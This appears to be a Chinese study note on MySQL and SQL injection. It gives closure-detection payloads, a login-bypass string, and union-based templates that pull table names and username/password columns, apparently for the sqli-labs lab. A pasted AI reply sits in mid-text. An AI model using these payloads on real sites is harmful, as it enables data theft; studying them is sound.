---
title: "SQL注入知识整理"
date: 2025-05-05
tags: ["SQL注入", "Web安全", "数据库"]
categories: ["学习笔记"] 
---

## 数据库
**数据库**是一种用于收集已组织好的数据以便于搜索、结构化和扩充的存储系统。

网站开发中，大多数数据库采用关系型数据库管理系统（RDBMS）来组织数据，通过** SQL 语言**来编程。但有些数据库没有遵循上述的组织数据的机制，这类被称作 **NoSQL 数据库**。

被广泛使用的服务端关系型数据库有**MySQL**（或者它的分支 MariaDB）、SQL Server 和 Oracle Database 等。另一边，出名的 NoSQL 数据库有 MongoDB、Cassandra 和 Redis 等。
#### MySQL

- MySQL是开源的，而且可以根据不同的需求进行定制。我们通过客户端程序可以进行连接（比如PHP,Java,python等），然后还需要通过账号密码来登录。

- **MySQL的基本命令操作:**

  ***SQL语法特点：***

1. 以分号(;)结尾，且关键词不区分大小写（一般可以关键词全大写,与参数区分开）
2. #：注释从#字符到行尾 
    -- ：注释从-- 序列到行尾。使用此注释时，后面需要跟上一个或多个空格 
    /* */ ：注释从 /* 序列到后面的 */ 序列中间的字符。注意 /*!*/ 不是注释，例如：/*！ 55555,name*/ 意思是：若MySQL版本号大于等于5.55.55，语句将会被执行，如果！后面不加入版本号，MySQL将会直接执行SQL语句。


  ***SQL语句***：

  - ***DDL(Data Definition Language):数据定义语言，操作整个库，表结构***
    查看数据库列表`show databases`
    创建数据库`create database 数据库名称`
    删除数据库`drop database 数据库名称`
    修改数据库`alter database 数据库名称 charset=编码方式 -- 修改编码方式`
    使用数据库`use 库名`
    查看当前正在使用的数据库`select database()`
    创建数据表`create table 表名(列名1 数据类型(可选),列名2 数据类型(可选)...);`
    
  - ***DML(Manipulation):数据操作语言，操作表内部的数据***
    insert插入一行数据`insert into 表名 (列名1,列名2...) values (数据)`
  	           注：可以省略列名，这样插入的数据就会按列顺序依次插入对应的列;
                      可以只插入部分列，对应没有插入的列都会用null填充
    delete删除数据`delete from 表名 where 条件`(如果不设置where条件，那整个表的数据会被全部删除)
    update修改数据`update 表名 set 列=值,列=值.... where 条件`
    
  - ***DCL(Control):数据控制语言，改变数据库和用户的权限***
    创建用户`CREATE USER 用户名@地址(@'host') IDENTIFIED BY '密码';`
    给用户授权`GRANT 权限1, … , 权限n ON 数据库.对象  TO 用户名;`
    取消权限`REVOKE 权限1, … , 权限n ON 数据库.对象  FROM 用户名;`
    查看用户权限`show grants for 用户名;`
    
  - ***DQL(Query):数据查询语言，用来查询数据***

  ```
  SELECT 要查询的列名称(*表示所有列)
  FROM 表名称
  WHERE 限定条件 （ 行条件 ）
  GROUP BY grouping_columns （对结果分组）
  HAVING condition （分组后的行条件 ）
  ORDER BY sorting_columns （对结果排序）
  LIMIT offset_start，row_count （结果限定）
  ```

  **查询列**`select * from 表名; --查询所有列`
              `select 列名 from 表名; --查询指定列`
  **条件查询**`select * from 表名 where 条件;`
  **模糊查询**
  ```
  select * from test_table where name like 'a%';
  -- 模糊查询，只查询名字以a开头的一行
  '_':任意一个字符
  '%':任意多个字符(可以是0个)
  ```
  **为结果排序**

`select * from test_table order by age asc;`（asc是升序，desc是降序，默认是升序）
  **分页查看查询结果**

  ```
  select * from test_table limit 0,2
  -- limit 0,2 表示从第0行开始，只显示2行记录
  ```
**联合查询**
  ```
  select * from table1 union select * from test_table;
  -- union 合并前后两个(或者多个)select的结果，默认去重
  -- 两个表的字段数(列数)必须相同，且对应列的数据类型应兼容（MySQL 不强制相同，但最好一致）
  ```
- **MySQL使用**
  先进入mysql的安装目录（PHPStudy安装的，在PHPStudy 中的Extensions\MySQL...\bin）

  然后输入命令：`mysql -u root(用户名) -p`，在输入密码，连接上以后就可以通过命令行执行SQL语句了，可以打\h自行探索

## SQL注入

### SQL注入原理 
- SQL注入产生的原因：
当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。
- SQL注入的本质：
  服务器把用户的输入作为SQL语句的一部分来执行，违背了“数据和代码分离原则”
  **万能密码**`1' or '1' = '1`
  ```
  原始查询：SELECT * FROM users WHERE username='admin' AND password='$password'
输入密码：1' or '1'='1
  拼接后：SELECT * FROM users WHERE username='admin' AND password='1' or '1'='1'
  -- '1'='1'是恒真的，所以整个判断语句'1' or '1'='1'也一定为真
  ```


### SQL注入常用函数与系统表

#### 1. 信息获取函数
| 函数 | 返回值 | 示例 |
|------|--------|------|
| `database()` | 当前数据库名 | `SELECT database();` |
| `version()` | MySQL 版本 | `SELECT version();` |
| `user()` | 连接数据库的用户 | `SELECT user();` |
| `@@datadir` | 数据目录路径 | `SELECT @@datadir;` |

#### 2. 字符串处理（常用于注入）
| 函数 | 作用 | 示例 |
|------|------|------|
| `group_concat(col)` | 将多行某列拼接为单行字符串，默认逗号分隔 | `SELECT group_concat(username) FROM users;` |
| `concat(a,b,c)` | 连接多个字符串 | `SELECT concat('a','b','c');` → `abc` |
| `concat_ws(sep,a,b)` | 带分隔符的连接 | `SELECT concat_ws(',','a','b');` → `a,b` |
| `length(str)` | 返回字符串长度 | `SELECT length('abc');` → `3` |
| `substr(str,pos,len)` | 截取子串 | `SELECT substr('abc',2,1);` → `b` |

#### 3. 系统数据库 `information_schema`
MySQL 自带，存储所有数据库的元数据。即使权限受限，一般也能读取。

**常用表：**
- `tables`：包含 `table_schema`（库名）、`table_name`（表名）
- `columns`：包含 `table_schema`、`table_name`、`column_name`

**典型查询：**
```sql
-- 查询某库下的所有表
SELECT table_name FROM information_schema.tables WHERE table_schema='库名';

-- 查询某表的所有列
SELECT column_name FROM information_schema.columns WHERE table_schema='库名' AND table_name='表名';
```

好的，以下是独立的 **“注入点闭合方式识别”** 章节，可以直接插入到你的 `SQL注入知识整理.md` 中的 `### SQL注入方法` 之前（或之后），作为通用前置知识。



### 注入点闭合方式识别

#### 1.为什么需要识别闭合方式？
后端 SQL 语句中，用户输入的参数可能被单引号、双引号、括号等字符包裹。注入时必须先**闭合**这些包裹符，并用注释符（如 `--+` 或 `#`）截断后续的 SQL 片段，否则构造的恶意语句会产生语法错误，导致注入失败。

#### 2.通用探测方法
依次提交以下 payload，观察页面变化（从正常显示 → 报错 → 恢复正常）：

| Payload | 预期恢复正常的情况 | 推断的闭合方式 |
|---------|-------------------|----------------|
| `1' --+` | 恢复正常 | 单引号 `'` |
| `1" --+` | 恢复正常 | 双引号 `"` |
| `1') --+` | 恢复正常 | 单引号 + 右括号 `')` |
| `1") --+` | 恢复正常 | 双引号 + 右括号 `")` |
| `1')) --+` | 恢复正常 | 两个右括号 + 单引号 `'))` |
| `1"))) --+` | 恢复正常 | 多括号嵌套（类推） |

> 注：`--+` 中 `+` 在 URL 中被解码为空格，作为注释符。也可使用 `#`（需编码为 `%23`）或 `--%20`。

#### 3.验证方法
找到疑似闭合方式后，用逻辑条件测试：
```
?id=1[闭合符] and 1=1 --+   → 正常显示
?id=1[闭合符] and 1=2 --+   → 无显示
```
若满足上述差异，则闭合方式正确。

#### 4.常见闭合方式速查表
| 后端 SQL 示例（伪代码） | 闭合方式 | 测试 Payload |
|------------------------|----------|--------------|
| `WHERE id = $id` | 无（数字型） | `1 and 1=1` |
| `WHERE id = '$id'` | `'` | `1' and 1=1 --+` |
| `WHERE id = "$id"` | `"` | `1" and 1=1 --+` |
| `WHERE id = ('$id')` | `')` | `1') and 1=1 --+` |
| `WHERE id = ("$id")` | `")` | `1") and 1=1 --+` |
| `WHERE id = (('$id'))` | `'))` | `1')) and 1=1 --+` |

#### 5.小技巧
- 先尝试最简单的 `'` 和 `"`，如果不成功再加括号。
- 观察错误信息中回显的 SQL 片段，有时会直接提示闭合字符（例如 `near ''1'') LIMIT` 暗示了 `')`）。
- 如果页面完全没有错误回显（盲注），则需要通过布尔或时间差异来盲猜闭合方式，效率较低，优先尝试常见组合。




### SQL注入方法

#### 1. 联合查询注入 

##### 1.1 什么是联合查询注入
攻击者利用 SQL 的 `UNION` 关键字，将自定义的 `SELECT` 语句结果附加到原始查询结果之后，从而在页面回显位置直接获取数据库中的敏感信息。

##### 1.2 适用条件


- 存在 SQL 注入漏洞。
- 页面有明确的回显位（即查询结果中的某些列会被输出到页面）。
- 攻击者能够控制 `UNION` 后面的查询语句。


##### 1.3 核心原理
  `UNION` 操作符用于合并两个或多个 `SELECT` 语句的结果集。使用时有两条硬性规则：
  1. **列数必须相同**：所有 `SELECT` 语句必须返回相同数量的列。
  2. **数据类型应兼容**：对应列的数据类型必须能隐式转换（注入中常用数字 `1,2,3` 占位，因为数字与大多数字符串类型兼容）。

##### 1.4 不同闭合方式的 Payload 示例
- **数字型**（无闭合）：`?id=-1 union select 1,2,3`

  注：数字型一般不需要注释符，但如果原语句后面还有其他条件导致报错，可加 `--+` 注释。

- **单引号字符型**：`?id=-1' union select 1,2,3 --+`

- **双引号字符型**：`?id=-1" union select 1,2,3 --+`

- **单引号+括号**：`?id=-1') union select 1,2,3 --+`

- **双引号+括号**：`?id=-1") union select 1,2,3 --+`

##### 1.5 注：
1. **用 `ORDER BY N`  探测原始查询的列数**
>`ORDER BY N` 表示按查询结果的**第 N 列**进行排序。如果实际结果只有 M 列，执行 `ORDER BY M+1` 时，数据库会因找不到该列而报错。因此，通过递增 N 直到报错，可以确定原始查询的列数。

2. **构造 `UNION SELECT 1,2,3,...`时使原始查询结果为空，例如设置 `id=-1`**
>当使用 `UNION SELECT` 时，数据库会返回两行（或更多）结果：
第一行：原始查询的结果（比如正常 id 对应的数据）。
第二行：`UNION` 附加的自定义数据。
应用程序通常**只取结果集中的第一行**来显示。若第一行有数据，自定义数据就不会被看到。因此，需要让原始查询返回空结果集。常用手法是给参数一个**不存在**的值（如 `-1`、`9999`、`111`），使原始查询无记录，从而只显示 `UNION` 后的内容。

3. **显示位的概念**
>即使查询返回多列，页面也只会展示其中特定几列。例如 sqli-labs Less-1 中页面有 `Your Login name:` 和 `Your Password:` 两个输出位置，分别对应结果集的第 2 列和第 3 列。这两个位置就是**显示位**。攻击时需要先确定哪些列的数据会被回显，然后将恶意查询的结果放在这些列上。
确定显示位的方法(以单引号字符型为例)：
```sql
?id=-1' UNION SELECT 1,2,3 --+
```

##### 1.6 典型 Payload 模板(以单引号字符型为例)

**思路**：

>1.判断注入点（引号、注释、真假条件）。
>2.判断列数（order by）。
>3.尝试 union 看是否有回显（显示位）。
>4.如有回显 → 用联合查询直接拿数据。
>如无回显 → 考虑布尔盲注或时间盲注。

```sql
-- 假设注入点闭合字符为单引号，注释符为 --
-- 探测列数
?id=1' ORDER BY 3 --+

-- 确定显示位
?id=-1' UNION SELECT 1,2,3 --+

-- 获取当前数据库名
?id=-1' UNION SELECT 1,2,database() --+

-- 获取表名（利用 information_schema）
?id=-1' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='database_name' --+

-- 获取列名
?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema='database_name' AND table_name='table_name' --+

-- 获取数据
?id=-1' UNION SELECT 1,group_concat(username),group_concat(password) FROM database_name.table_name --+
```



